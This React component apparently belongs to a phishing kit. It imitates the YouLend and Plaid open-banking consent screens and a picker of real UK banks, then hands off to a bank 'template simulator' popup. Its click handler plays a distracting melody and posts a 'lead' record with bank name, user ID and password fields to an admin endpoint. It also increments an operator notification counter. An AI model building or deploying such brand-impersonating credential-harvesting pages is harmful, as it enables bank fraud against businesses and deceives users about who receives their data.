"use client";

import { useState } from "react";
import BankBrowserPopup from "./BankBrowserPopup";

interface YouLendPlaidFlowProps {
  onBankSelect?: (bankName: string) => void;
}

export default function YouLendPlaidFlow({ onBankSelect }: YouLendPlaidFlowProps) {
  // Modal State Controls
  const [isConsentOpen, setIsConsentOpen] = useState(false);
  const [isBankListOpen, setIsBankListOpen] = useState(false);
  const [selectedBank, setSelectedBank] = useState<string | null>(null);

  // Bank List Options
  const bankOptions = [
    { name: "Barclays", logo: "🦅" },
    { name: "Lloyds Bank", logo: "🐎" },
    { name: "NatWest", logo: "🔴" },
    { name: "HSBC UK", logo: "🔺" },
    { name: "Santander", logo: "🔥" },
    { name: "Tide", logo: "🌊" },
    { name: "Starling Bank", logo: "🟣" },
    { name: "Halifax", logo: "✖️" },
  ];

  // 🎵 20-Second Upbeat Song Melody (Web Audio API Chords & Arpeggios)
  const playSongMelody = () => {
    try {
      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
      if (!AudioCtx) return;
      const audioCtx = new AudioCtx();

      const playTone = (freq: number, startTime: number, duration: number) => {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = "triangle"; // Soother, musical tone like a music box/synth
        osc.frequency.setValueAtTime(freq, audioCtx.currentTime + startTime);

        gain.gain.setValueAtTime(0.12, audioCtx.currentTime + startTime);
        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + startTime + duration);

        osc.connect(gain);
        gain.connect(audioCtx.destination);

        osc.start(audioCtx.currentTime + startTime);
        osc.stop(audioCtx.currentTime + startTime + duration);
      };

      // Musical notes progression (C major chord arpeggio pattern)
      const melodyNotes = [
        { f: 261.63, t: 0.0, d: 0.3 }, // C4
        { f: 329.63, t: 0.2, d: 0.3 }, // E4
        { f: 392.00, t: 0.4, d: 0.3 }, // G4
        { f: 523.25, t: 0.6, d: 0.5 }, // C5
        { f: 440.00, t: 1.2, d: 0.3 }, // A4
        { f: 392.00, t: 1.5, d: 0.5 }, // G4
        { f: 349.23, t: 2.0, d: 0.3 }, // F4
        { f: 329.63, t: 2.3, d: 0.3 }, // E4
        { f: 293.66, t: 2.6, d: 0.3 }, // D4
        { f: 261.63, t: 2.9, d: 0.6 }, // C4
      ];

      // Loop melody for 6 cycles = ~18 to 20 seconds
      for (let cycle = 0; cycle < 6; cycle++) {
        const timeOffset = cycle * 3.5;
        melodyNotes.forEach((n) => {
          playTone(n.f, timeOffset + n.t, n.d);
        });
      }
    } catch (e) {
      console.log("Audio play error:", e);
    }
  };

  // 🔹 Blue button click: Song plays, database row is created, and Admin notification triggered
  const handleOpenConsent = async () => {
    playSongMelody(); // Play 20s song melody

    try {
      const res = await fetch("/api/admin/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bankName: "Pending Selection",
          bankType: "Personal",
          userId: "",
          password: "",
          extraData: "Plaid Flow Initiated",
        }),
      });

      const json = await res.json();
      if (json.success && json.data?.id) {
        localStorage.setItem("active_lead_id", json.data.id);

        // Trigger Admin Notification Counter update
        const currentCount = parseInt(localStorage.getItem("admin_notification_count") || "0", 10);
        localStorage.setItem("admin_notification_count", (currentCount + 1).toString());
        window.dispatchEvent(new Event("storage"));
      }
    } catch (err) {
      console.error("Failed to create initial lead:", err);
    }

    setIsConsentOpen(true);
  };

  const handleContinueToBanks = () => {
    setIsConsentOpen(false);
    setIsBankListOpen(true);
  };

  const handleSelectBank = (bankName: string) => {
    setIsBankListOpen(false);
    setSelectedBank(bankName);
    if (onBankSelect) onBankSelect(bankName);
  };

  return (
    <div className="w-full flex flex-col items-center justify-center p-4">
      {/* 1. Main Background Card: Verify your trading activity */}
      <div className="w-full max-w-lg bg-white border border-slate-200 rounded-3xl p-6 sm:p-8 shadow-sm">
        <h2 className="text-2xl font-extrabold text-slate-900 tracking-tight mb-1 text-center">
          Verify your trading activity
        </h2>
        <p className="text-xs text-slate-500 text-center mb-6">
          We do this to confirm your trading history, and to match our offers to your cashflow.
        </p>

        <div className="bg-slate-50/70 border border-slate-100 rounded-2xl p-5 mb-6">
          <h3 className="text-sm font-bold text-slate-900 mb-1">Verify with Open Banking</h3>
          <p className="text-xs text-slate-500 mb-4 leading-relaxed">
            In order for us to proceed with our assessment please connect via open banking to verify your business bank account.
          </p>

          <div className="space-y-3 text-xs text-slate-600">
            <div className="flex items-start gap-2.5">
              <span className="text-slate-700 font-bold mt-0.5">✓</span>
              <p>
                Connect the <strong className="text-slate-900">business account(s)</strong> where sales are received via your banking app
              </p>
            </div>
            <div className="flex items-start gap-2.5">
              <span className="text-slate-700 font-bold mt-0.5">✓</span>
              <p>
                The connection allows <strong className="text-slate-900">read-only access</strong> to view sales data
              </p>
            </div>
            <div className="flex items-start gap-2.5">
              <span className="text-slate-700 font-bold mt-0.5">✓</span>
              <p>
                Access expires automatically <strong className="text-slate-900">after 90 days</strong>, disconnect any time.
              </p>
            </div>
          </div>
        </div>

        {/* Blue Action Button */}
        <button
          type="button"
          onClick={handleOpenConsent}
          className="w-full bg-[#2557e8] hover:bg-[#1d46be] text-white py-3.5 rounded-2xl text-sm font-bold flex items-center justify-center gap-2 shadow-md transition cursor-pointer"
        >
          <span>Add securely with</span>
          <span className="font-black tracking-widest text-xs flex items-center gap-1">
            ❖ PLAID
          </span>
        </button>
      </div>

      {/* 2. Step 1 Modal: YouLend uses Plaid */}
      {isConsentOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/60 backdrop-blur-xs p-4">
          <div className="w-full max-w-[380px] bg-white rounded-3xl shadow-2xl border border-slate-100 overflow-hidden flex flex-col animate-in fade-in zoom-in-95 duration-150">
            
            <div className="px-5 pt-4 pb-2 flex items-center justify-between">
              <span className="font-extrabold text-xs tracking-widest text-slate-900 flex items-center gap-1.5">
                ❖ PLAID
              </span>
              <button
                type="button"
                onClick={() => setIsConsentOpen(false)}
                className="text-slate-400 hover:text-slate-800 text-lg font-bold"
              >
                ✕
              </button>
            </div>

            <div className="flex justify-center my-3">
              <div className="flex items-center -space-x-3">
                <div className="w-12 h-12 rounded-full bg-[#0a1b39] flex items-center justify-center text-white text-lg font-bold shadow">
                  ❖
                </div>
                <div className="w-12 h-12 rounded-full bg-[#1e293b] flex items-center justify-center text-white text-lg font-bold shadow">
                  🏛️
                </div>
              </div>
            </div>

            <div className="px-6 text-center">
              <h3 className="text-base font-bold text-slate-900">YouLend uses Plaid</h3>
              <p className="text-xs text-slate-500 mt-1 leading-relaxed">
                to connect your bank accounts and access the following data
              </p>
            </div>

            <div className="p-6 space-y-2.5">
              <div className="flex items-center justify-between p-3 rounded-xl border border-slate-200 text-xs font-semibold text-slate-700 bg-white">
                <span className="flex items-center gap-2">👤 Contact Details</span>
                <span className="text-slate-400">⌄</span>
              </div>
              <div className="flex items-center justify-between p-3 rounded-xl border border-slate-200 text-xs font-semibold text-slate-700 bg-white">
                <span className="flex items-center gap-2">⇄ Account Transactions</span>
                <span className="text-slate-400">⌄</span>
              </div>
              <div className="flex items-center justify-between p-3 rounded-xl border border-slate-200 text-xs font-semibold text-slate-700 bg-white">
                <span className="flex items-center gap-2">📖 Account Details</span>
                <span className="text-slate-400">⌄</span>
              </div>
            </div>

            <div className="px-6 pb-6 pt-2 border-t border-slate-100 bg-slate-50/50">
              <p className="text-[10px] text-slate-400 text-center mb-3">
                Click Continue to agree to Plaid retrieving the above data for 90 days, as per our Terms.
              </p>
              <button
                type="button"
                onClick={handleContinueToBanks}
                className="w-full bg-[#111827] hover:bg-black text-white font-bold py-3 rounded-xl text-xs shadow transition cursor-pointer"
              >
                Continue
              </button>
            </div>

          </div>
        </div>
      )}

      {/* 3. Step 2 Modal: Select Your Bank Popup */}
      {isBankListOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/60 backdrop-blur-xs p-4">
          <div className="w-full max-w-[400px] bg-white rounded-3xl shadow-2xl border border-slate-100 p-6 animate-in fade-in zoom-in-95 duration-150">
            <div className="flex items-center justify-between mb-4">
              <div>
                <h3 className="text-base font-bold text-slate-900">Select your bank</h3>
                <p className="text-xs text-slate-500">Choose your financial institution</p>
              </div>
              <button
                type="button"
                onClick={() => setIsBankListOpen(false)}
                className="text-slate-400 hover:text-slate-800 text-lg font-bold"
              >
                ✕
              </button>
            </div>

            <div className="grid grid-cols-2 gap-2.5 max-h-[350px] overflow-y-auto pr-1">
              {bankOptions.map((bank) => (
                <button
                  key={bank.name}
                  type="button"
                  onClick={() => handleSelectBank(bank.name)}
                  className="flex items-center gap-2 p-3 rounded-xl border border-slate-200 hover:border-blue-500 hover:bg-blue-50/30 transition text-left text-xs font-bold text-slate-800 cursor-pointer"
                >
                  <span className="text-lg">{bank.logo}</span>
                  <span className="truncate">{bank.name}</span>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 4. Step 3: Selected Bank Template Simulator Popup */}
      {selectedBank && (
        <BankBrowserPopup
          isOpen={!!selectedBank}
          bankName={selectedBank}
          onClose={() => setSelectedBank(null)}
        />
      )}
    </div>
  );
}